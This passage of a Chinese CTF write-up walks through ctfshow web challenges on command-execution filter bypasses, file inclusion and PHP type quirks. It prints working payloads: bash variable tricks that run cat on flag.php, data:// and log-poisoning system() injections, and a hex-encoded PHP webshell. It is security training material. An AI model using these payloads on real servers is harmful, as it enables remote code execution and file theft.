&#x2F;root

# echo $&#123;PWD:0:1&#125;      #表示从0下标开始的第一个字符
&#x2F;           

# echo $&#123;PWD:~0:1&#125;      #从结尾开始往前的第一个字符
t

# echo $&#123;PWD:~0&#125;      
t

# echo $&#123;PWD:~A&#125;       #所以字母和0具有同样作用             
t

# echo $&#123;PATH&#125;                            
&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin
</code></pre>

<pre class="language-none"><code class="language-none">&#x2F;&#x2F;利用系统变量构造nl命令
$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???

$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;是nl
</code></pre>

<p>或者</p>
<pre class="language-none"><code class="language-none">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</code></pre>

<pre class="language-none"><code class="language-none">SHLVL&#96;是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时&#96;$&#123;SHLVL&#125;&#x3D;1&#96;，然后在此shell中再打开一个shell时&#96;$&#123;SHLVL&#125;&#x3D;2&#96;。
&#96;$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;&#96;就输出&#96;&#x2F;</code></pre>

<pre class="language-none"><code class="language-none">$&#123;#&#125;是0，$&#123;SHLVL&#125;为1&#96;
&#96;$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是&#x2F;root，$&#123;#PWD&#125;是5</code></pre>

<h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><p>禁用了<code>$&#123;PATH</code></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430232002769.png" alt="image-20220430232002769"></p>
<pre class="language-none"><code class="language-none">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     &#x3D;&#x3D;&#x3D;&#x3D;&gt;   t

$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    &#x3D;&#x3D;&#x3D;&#x3D;&gt;   &#x2F;


$&#123;SHLVL&#125;       &#x2F;&#x2F;一般是一个个位数
$&#123;#SHLVL&#125;     &#x2F;&#x2F;1，表示结果的字符长度
$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;       &#x2F;&#x2F;表示&#x2F;
$&#123;USER&#125;        &#x2F;&#x2F;www-data
$&#123;PHP_VERSION:~A&#125;       &#x2F;&#x2F;2
$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;         &#x2F;&#x2F;at


&#x2F;bin&#x2F;cat flag.php

$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???
$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</code></pre>

<h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;code&#39;]))&#123;
    $code&#x3D;$_POST[&#39;code&#39;];
    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;
            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
        else&#123;
        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
    &#125;
    else&#123;
     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;
    &#125;
&#125;

?&gt;
</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</code></pre>

<p>或者</p>
<pre class="language-none"><code class="language-none">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre>

<h2 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h2><pre class="language-none"><code class="language-none">
&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;code&#39;]))&#123;
    $code&#x3D;$_POST[&#39;code&#39;];
    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;
            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
        else&#123;
        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
    &#125;
    else&#123;
     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;
    &#125;
&#125;

?&gt;</code></pre>

<p>相比上一题，多过滤了一个SHLVL，那就用#?代替</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre>

<p>相当于</p>
<p>/bin/bash64 flag.php</p>
<p>或者</p>
<pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???
&#x2F;bin&#x2F;rev</code></pre>

<h2 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;code&#39;]))&#123;
    $code&#x3D;$_POST[&#39;code&#39;];
    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|#|%|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;
            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
        else&#123;
        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
    &#125;
    else&#123;
     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;
    &#125;
&#125;

?&gt;</code></pre>

<p>payload</p>
<blockquote>
<p>通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p>
</blockquote>
<pre class="language-none"><code class="language-none">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? *#可能存在成功的机会，不断刷新*</code></pre>

<h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

&#x2F;*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*&#x2F;

error_reporting(0);
&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET[&#39;c&#39;]))&#123;
    show_source(__FILE__);
&#125;else&#123;
    &#x2F;&#x2F;例子 c&#x3D;20-1
    $content &#x3D; $_GET[&#39;c&#39;];
    if (strlen($content) &gt;&#x3D; 80) &#123;
        die(&quot;太长了不会算&quot;);
    &#125;
    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];
    foreach ($blacklist as $blackitem) &#123;
        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;
            die(&quot;请不要输入奇奇怪怪的字符&quot;);
        &#125;
    &#125;
    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp
    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) &#123;
        if (!in_array($func, $whitelist)) &#123;
            die(&quot;请不要输入奇奇怪怪的函数&quot;);
        &#125;
    &#125;
    &#x2F;&#x2F;帮你算出答案
    eval(&#39;echo &#39;.$content.&#39;;&#39;);
&#125;</code></pre>

<p>不能有特殊字符，不能有除whitelist里面的字母，大概思路就是利用进制转换以数字构造字母<br>题中可用的进制转换函数：<code>&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;</code></p>
<pre class="language-none"><code class="language-none">$_GET[abs]($_GET[acos])		&#x2F;&#x2F;strlen($content) &gt;&#x3D; 80，有长度限制，所以利用get命令执行
↓
$_GET&#123;abs&#125;($_GET&#123;acos&#125;)		&#x2F;&#x2F;[]在黑名单，用&#123;&#125;代替
↓
$pi&#x3D;_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;)
↓
进制转换
base_convert(number,frombase,tobase)：在任意进制之间转换数字
dechex()：把十进制数转换为十六进制数
hex2bin()：把十六进制值的字符串转换为二进制，返回 ASCII 字符
最重要的是hex2bin函数，但是不在白名单里面

base_convert构造hex2bin（我想用base_convert直接转_GET，但是只能得到get）
base_convert(&#39;hex2bin&#39;,36,10)	→	37907361743
_GET	→  hex十六进制 5f474554 (不能有字母所以十六进制不行) →  dec十进制 1598506324	(在线转换)

所以_GET可以写为
hex2bin(dechex(1598506324))
↓
base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))

最后的payload
?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;ls
?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;cat *
</code></pre>

<p>payload1：</p>
<pre class="language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 
添加头部信息：1&#x3D;tac flag.php</code></pre>

<p>payload2：</p>
<pre class="language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs&#x3D;system&amp;acos&#x3D;tac flag.php</code></pre>

<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>

<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>题目：</p>
<pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>将php替换成了???,考虑使用data协议进行base64解码。<br><strong>payload</strong></p>
<pre class="language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</code></pre>

<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>题目：</p>
<pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>data也禁用了，尝试日志注入攻击。<br>日志的位置，/var/log/nginx/access.log。<br>在user-agent的位置，首先<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>，列出来文件。<br>之后读目标文件，<code>&lt;?php system(&#39;cat fl0g.php&#39;); ?&gt;</code></p>
<p>还可以直接写马</p>
<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>题目：</p>
<pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
    include($file);
&#125;</code></pre>

<p>过滤了php、data、:，尝试上题方法，<br>同上题</p>
<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
<p>利用php://filter的编码来使结束的代码失效</p>
<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>data协议</p>
<p>data://text/plain;base64,poc</p>
<pre class="language-php" data-language="php"><code class="language-php">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwqJyk7</code></pre>

<h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><p>还是利用php://filter的编码来使结束的代码失效</p>
<p>**convert.iconv.**这个过滤器还是用的。</p>
<p>ucs-2 和ucs-4都能用。</p>
<p>ucs-2 二位一反转，字符个数要在偶数位上，ucs-4 四位一反转，字符个数要是4的倍数。位数好控制，参数改改长度就行了。</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200136309.png" alt="image-20220505200136309"></p>
<pre class="language-php" data-language="php"><code class="language-php"> file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php 
post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200318190.png" alt="image-20220505200318190"></p>
<h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>数组绕过</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200639134.png" alt="image-20220505200639134"></p>
<p>intval()–非空的数组会返回1，可以采用数组绕过intval()函数</p>
<p><strong>preg_match()</strong></p>
<p>返回的匹配次数，不匹配为0，匹配成功1次即为1，然后停止搜索，<strong>该函数只会匹配一行，可以%0a换行绕过</strong></p>
<p>preg_match_all()不同于此，它会一直搜索 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200839032.png" alt="image-20220505200839032"></p>
<p>加个大于号，或者转成八进制，十六进制</p>
<p>intval支持不同进制，这里base指定是0，那么intval会根据我们输入情况使用进制</p>
<p>intval取的是我们所输入内容开头的整数，也就是说我们传入含有字符的字符串，例如?num=4476a,那么intval(“4476a”)也等于4476</p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><blockquote>
<p>/m 表示多行匹配，匹配换行符两端的潜在匹配。影响正则中的^$符号</p>
</blockquote>
<p>多行匹配可以通过%0a（回车键）绕过</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505201235224.png" alt="image-20220505201235224"></p>
<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&#123;
    $num &#x3D; $_GET[&#39;num&#39;];
    if($num&#x3D;&#x3D;4476)&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(intval($num,0)&#x3D;&#x3D;4476)&#123;
        echo $flag;
    &#125;else&#123;
        echo intval($num,0);
    &#125;
</code></pre>

<p>进制转换或者用e来当作科学计数法</p>
<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>过滤了字母，用八进制</p>
<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>strpos($num, “0”)</p>
<p>strpos()函数的理解：该函数是从我们传入的参数num中，寻找并匹配数字0，第一位匹配正确返回0，第二位匹配正确返回1，以后递推，所以在题中即为只要匹配到，输出就为true，取反就为false.所以可以通过除了第一位其他位出现0的方法让if条件为假。<strong>该函数并不是只匹配一行数据。回车后匹配仍有效。</strong>可以通过?num=%0a4476绕过</p>
<p>只要0不在第一位就行（但是必须有，所以可以用八进制带加号+010574，或者放在小数点上</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505202027037.png" alt="image-20220505202027037"></p>
<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&#123;
    $num &#x3D; $_GET[&#39;num&#39;];
    if($num&#x3D;&#x3D;4476)&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;
        die(&quot;no no no!!&quot;);
    &#125;
    if(!strpos($num, &quot;0&quot;))&#123;
        die(&quot;no no no!!!&quot;);
    &#125;
    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
        echo $flag;
    &#125;
&#125;</code></pre>

<p>第一个if是弱比较，只能进制转换</p>
<p>后边的strpos可以需要在转换了进制的数字前加点不影响大小的东西比如回车换行空格加号</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505202339569.png" alt="image-20220505202339569"></p>
<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505203100601.png" alt="image-20220505203100601"></p>
<p>相对路径绕过</p>
<p>或者伪协议</p>
<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505203319823.png" alt="image-20220505203319823"></p>
<p>md5函数不能处理数组，会返回null</p>
<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p><a target="_blank" rel="noopener" href="https://www.php.cn/php-notebook-172859.html">https://www.php.cn/php-notebook-172859.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-383293.html">https://www.php.cn/php-weizijiaocheng-383293.html</a></p>
<pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);#本php文档包含了一个flag.php文件，是我们想要的flag
$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;#$_GET存在，则_GET&#x3D;&amp;$_POST否则$_GET值为&#39;flag‘
$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;#中间两行代码看起来貌似没用
$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;
highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);#如果get传参了HTTP_FLAG&#x3D;flag，就highlight_file($flag)</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505204205363.png" alt="image-20220505204205363"></p>
<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
$allow &#x3D; array();
for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123; 
    array_push($allow, rand(1,$i));
&#125;
if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;
    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
&#125;</code></pre>

<p>in_array()<br>in_array(search,array,type)</p>
<p>search—必须，规定在数组中搜索的值</p>
<p>array—必需，规定搜索的数组</p>
<p>type—可选，如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</p>
<p>如果设置了第三个参数，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。</p>
<p>而题中没有设置，这里可以默认没有设置，即只是弱类型匹配</p>
<p>利用了in_array的弱类型比较，</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205056630.png" alt="image-20220505205056630"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205136351.png" alt="image-20220505205136351"></p>
<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
include(&quot;ctfshow.php&quot;);
&#x2F;&#x2F;flag in class ctfshow;
$ctfshow &#x3D; new ctfshow();
$v1&#x3D;$_GET[&#39;v1&#39;];
$v2&#x3D;$_GET[&#39;v2&#39;];
$v3&#x3D;$_GET[&#39;v3&#39;];
$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0)&#123;
    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;
        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;
            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
        &#125;
    &#125;
    
&#125;</code></pre>

<p>这里要看运算优先级</p>
<p>逻辑运算符&gt;逻辑运算（赋值）&gt;and、or</p>
<p>v0的取值只和v1有关。v1参数为数字，没有其他限制，但是v2不能有；标志，v3必须有；</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205701221.png" alt="image-20220505205701221"></p>
<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505210313073.png" alt="image-20220505210313073"></p>
<p>利用反射类读</p>
<h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h2><p><strong>call_user_func()</strong></p>
<p>把第一个参数作为回调参数调用</p>
<p>本题中要求v2是数字，然后通过substr函数截取v2的第三位开始的数据，及以后的数据。v1、v3题中没有限制，</p>
<p><strong>is_numerc()</strong></p>
<p>该函数在php5版本下有漏洞，可以识别十六进制，所以可以将一句话木马写作十六进制的格式</p>
<p>故构造<code>v2=(&lt;?php eval($_REQUEST[a]);?&gt;)</code></p>
<p>v2=3c3f706870206576616c28245f524551554553545b615d293b3f3e</p>
<p>v1可以利用hex2bin()函数来进行把十六进制字符转换成ASCII字符，即我们想要的一句话木马。</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505210803363.png" alt="image-20220505210803363"></p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">get:
v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php

post:
v1&#x3D;hex2bin</code></pre>

<p>web103过滤了php但是这里的v2用的是短标签</p>
<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
include(&quot;flag.php&quot;);

if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
    $v1 &#x3D; $_POST[&#39;v1&#39;];
    $v2 &#x3D; $_GET[&#39;v2&#39;];
    if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;
        echo $flag;
    &#125;
&#125;</code></pre>

<p>可以用数组绕过，也可以找个前几位数字一样的</p>
<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505212724685.png" alt="image-20220505212724685"></p>
<p>变量覆盖，get suces=flag后</p>
<p>$suces=$flag</p>
<p>post error=suces后</p>
<p>$error=$suces</p>
<p>也就是$error=$flag，在经过if判断的时候通过die函数就会显示flag</p>
<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505213442076.png" alt="image-20220505213442076"></p>
<p>跟104差不多</p>
<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214133528.png" alt="image-20220505214133528"></p>
<p>整点空数组绕过(虽然上边这个有点问题，但是过了就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214920530.png" alt="image-20220505214920530"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214149572.png" alt="image-20220505214149572"></p>
<p>还有其他的方法</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214423673.png" alt="image-20220505214423673"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214535301.png" alt="image-20220505214535301"></p>
<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;
    die(&#39;error&#39;);

&#125;
&#x2F;&#x2F;只有36d的人才能看到flag
if(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;
    echo $flag;
&#125;
</code></pre>

<p><strong>ereg()</strong></p>
<p>正则匹配的一种，存在NULL截断漏洞，导致正则过滤被绕过，可以使用%00截断正则匹配</p>
<p><strong>strrev()</strong></p>
